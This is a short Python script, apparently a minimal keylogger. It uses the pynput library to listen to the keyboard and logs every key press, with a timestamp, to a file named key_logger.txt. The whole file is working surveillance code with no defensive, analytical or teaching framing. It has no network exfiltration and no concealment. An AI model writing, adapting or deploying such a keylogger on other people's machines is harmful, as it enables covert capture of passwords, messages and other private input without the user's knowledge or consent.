from pynput.keyboard import Key,Listener
import logging

log_dir = ""
logging.basicConfig(filename=(log_dir+"key_logger.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s:')

def on_press(Key):
    logging.info(str(Key))
    
with Listener(on_press=on_press) as listener:
    listener.join()
